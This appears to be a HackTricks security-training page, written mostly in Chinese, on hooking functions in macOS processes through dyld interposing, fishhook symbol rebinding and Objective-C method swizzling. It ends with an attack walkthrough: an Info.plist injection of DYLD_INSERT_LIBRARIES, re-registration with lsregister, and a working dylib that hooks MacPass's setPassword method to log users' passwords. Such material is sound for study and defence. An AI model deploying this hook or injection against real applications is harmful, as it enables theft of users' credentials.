# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

创建一个带有 **`__interpose` (`__DATA___interpose`)** 段（或带有 **`S_INTERPOSING`** 标志的段）的 **dylib**，其中包含指向 **original** 和 **replacement** 函数的 **function pointers** 元组。

然后，使用 **`DYLD_INSERT_LIBRARIES`** **inject** 这个 dylib（interposing 必须在主应用加载之前发生）。显然，适用于 **`DYLD_INSERT_LIBRARIES`** 的 [**restrictions**](macos-library-injection/index.html#check-restrictions) 在这里也同样适用。

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable 可以用于调试 interposing，并且会打印 interpose 过程。

另外要注意，**interposing 发生在进程和已加载的 libraries 之间**，它对 shared library cache 不起作用。

### Dynamic Interposing

现在也可以使用函数 **`dyld_dynamic_interpose`** 动态地 interpose 一个函数。这允许你在 **runtime** 中 **programmatically** interpose 一个函数，而不是只能从 **开始** 时进行。

只需要指定要 **替换的 function** 和 **replacement** function 的 **tuples**。
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### 导入表重绑定 (fishhook-style)

如果你已经在 **进程内** 拥有代码执行，并且想在不重启目标的情况下 hook 一个 **导入的 C function**，一个非常常见的原语是 **symbol rebinding**（由 **`fishhook`** 推广）。

这个技巧不使用 **`__interpose`** section，而是遍历 Mach-O 元数据（`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`），并 **覆盖当前 image 使用的 import slot**。这对于在一个 **已经运行** 的进程中 hook 函数，或者使用 **`rebind_symbols_image`** 只 hook **单个 image** 非常有用。

> [!TIP]
> 这只会影响那些 वास्तव上经过 **import pointer** 的调用。如果目标函数是在 **同一个 image 内直接调用** 的，那么就没有可重写的 imported slot，因此这种技巧看不到那个 call site。
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
在最近的 macOS 版本中，许多 rebinding 目标不再位于可写的 **`__DATA`** 页中。rebinders 通常需要在 patch 指针之前，先临时将 **`__DATA_CONST`** 设为可写。除此之外，在 Apple Silicon / **`arm64e`** 上，你还应预期存在 authenticated pointers 以及 **`__AUTH_CONST.__auth_got`** 中的额外间接层，因此只扫描传统的 lazy/non-lazy symbol pointer sections 的 rebinder 可能会漏掉一些 call sites。

> [!CAUTION]
> **`arm64e`** ABI 对许多 function pointers 使用 **Pointer Authentication (PAC)**。在 Intel 上可用的盲目 pointer writes，在 Apple Silicon 上可能会破坏某个 call site。编写你自己的 rebinder 或 inline hooker 时，要准备使用 **`<ptrauth.h>`** helpers，例如 **`ptrauth_sign_unauthenticated`** 或 **`ptrauth_auth_and_resign`**，并且要专门在 **`arm64e`** targets 上测试。

关于 **`__AUTH`**、**`__AUTH_CONST`** 和 **`__auth_got`** 的更多细节，请查看[这一页](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md)。

## Method Swizzling

在 ObjectiveC 中，一个 method 的调用方式如下：**`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

它需要 **object**、**method** 和 **params**。当 method 被调用时，会使用函数 **`objc_msgSend`** 发送一个 **msg**：`int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

object 是 **`someObject`**，method 是 **`@selector(method1p1:p2:)`**，arguments 是 **value1**、**value2**。

沿着 object structures 继续，可以到达一个 **methods array**，其中存放着 **names** 和指向 method code 的 **pointers**。

> [!CAUTION]
> 请注意，由于 methods 和 classes 是基于它们的 names 来访问的，这些信息会存储在 binary 中，因此可以通过 `otool -ov </path/bin>` 或 [`class-dump </path/bin>`](https://github.com/nygard/class-dump) 将其提取出来

### Accessing the raw methods

可以像下面这个例子一样访问 method 的信息，例如 name、params 数量或 address：
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### 使用 method_exchangeImplementations 的 Method Swizzling

函数 **`method_exchangeImplementations`** 允许**更改** **一个函数与另一个函数** 的 **implementation** 的 **address**。

> [!CAUTION]
> 因此，当调用一个函数时，**执行的是另一个函数**。
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> 在这种情况下，如果 **legit** 方法的 **implementation code** 会 **verifies** **method** **name**，它可能会 **detect** 这种 swizzling 并阻止它运行。
>
> 下面的 technique 没有这个限制。

### 使用 method_setImplementation 的 Method Swizzling

前面的格式很奇怪，因为你是在把两个方法的 implementation 互相替换。使用函数 **`method_setImplementation`**，你可以 **change** 一个 **method** 的 **implementation** 为另一个。

只要记住，在覆盖之前要 **store** 原始 implementation 的地址，如果你打算从新的 implementation 里调用它，因为之后再去定位那个地址就会困难得多。
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

在这个页面中讨论了不同的 hook 函数方式。然而，它们都涉及**在进程内部运行代码来进行攻击**。

为此，最容易使用的技术是通过环境变量注入一个 [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)。不过，我猜这也可以通过 [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port) 来实现。

然而，这两种选项都**仅限于** **未受保护的** binaries/processes。请查看每种技术以了解更多限制。

不过，function hooking 攻击非常具体，攻击者会这样做来**从进程内部窃取敏感信息**（否则你只会进行 process injection attack）。而这些敏感信息可能位于用户下载的 Apps 中，例如 MacPass。

因此，攻击者的路径要么是找到一个漏洞，要么移除应用程序的签名，通过应用程序的 Info.plist 注入 **`DYLD_INSERT_LIBRARIES`** env variable，添加类似这样的内容：
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
然后 **重新注册** 该应用程序：
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
在该库中加入 hooking 代码以 exfiltrate 信息：Passwords、messages...

> [!CAUTION]
> 请注意，在较新的 macOS 版本中，如果你**去掉了签名**的应用二进制文件，并且它之前已经执行过，macOS **将不再执行**该应用。

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## References

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
